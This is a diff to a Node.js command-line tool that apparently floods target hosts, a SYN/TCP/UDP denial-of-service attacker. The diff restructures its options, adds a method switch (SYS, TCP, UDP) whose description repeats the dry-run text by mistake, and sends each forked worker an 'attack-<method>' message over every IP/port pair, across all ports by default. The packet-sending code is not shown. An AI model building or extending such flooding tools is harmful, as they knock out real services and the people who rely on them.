@@ -6,27 +6,38 @@ import { Address } from './types';
 
 const getArgs = () => yargs
   .demandCommand(1)
-  .boolean('d')
-  .alias('d', 'dry-run')
-  .describe('d', 'dry run: do not actually perform the attack')
-  .string('p')
-  .alias('p', 'ports')
-  .describe('p', 'a range of ports to attack. e.g. 8000-8200')
-  .default('p', '1-65535')
-  .coerce('p', ports => {
-    const matches = ports.match(/^([0-9]{0,5})-([0-9]{0,5})$/);
-    if (!matches) {
-      throw new Error('Invalid port range')
+  .option('d', {
+    alias: 'dry-run',
+    boolean: true,
+    describe: 'dry run: do not actually perform the attack'
+  })
+  .option('m', {
+    alias: 'method',
+    string: true,
+    describe: 'method: do not actually perform the attack',
+    choices: ['SYS', 'TCP', 'UDP'],
+    default: 'SYS'
+  })
+  .option('p', {
+    alias: 'ports',
+    string: true,
+    describe: 'a range of ports to attack. e.g. 8000-8200',
+    default: '1-65535',
+    coerce: ports => {
+      const matches = ports.match(/^([0-9]{0,5})-([0-9]{0,5})$/);
+      if (!matches) {
+        throw new Error('Invalid port range')
+      }
+  
+      const lower = parseInt(matches[1], 10);
+      const upper = parseInt(matches[2], 10);
+  
+      if (lower > 65535 || upper > 65535 || upper < lower) {
+        throw new Error('Invalid port range');
+      }
+  
+      return { lower, upper };
     }
-
-    const lower = parseInt(matches[1], 10);
-    const upper = parseInt(matches[2], 10);
-
-    if (lower > 65535 || upper > 65535 || upper < lower) {
-      throw new Error('Invalid port range');
-    }
-
-    return { lower, upper };
   })
   .argv;
 
@@ -49,7 +60,7 @@ async function master() {
   }
 
   console.log('Using the following ip/port combinations:');
-  ipPorts.map(ipPort => console.log(` - ${ipPort.ip}:${ipPort.port}`));
+  ipPorts.forEach(ipPort => console.log(` - ${ipPort.ip}:${ipPort.port}`));
 
   if (args.dryRun) {
     console.log('Dry run; exiting early');
@@ -61,7 +72,10 @@ async function master() {
     const worker = cluster.fork();
 
     worker.on('online', () => {
-      worker.send({type: 'attack-SYN', data: ipPorts});
+      worker.send({
+        type: `attack-${args.method}`,
+        data: ipPorts
+      });
     });
   }
 
@@ -70,7 +84,9 @@ async function master() {
     console.log('Shutting down gracefully');
 
     for (const id in cluster.workers) {
-      cluster.workers[id].send({type: 'kill'});
+      cluster.workers[id].send({
+        type: 'kill'
+      });
     }
 
     // Wait until all clusters have been cleared from memory, then exit the process.
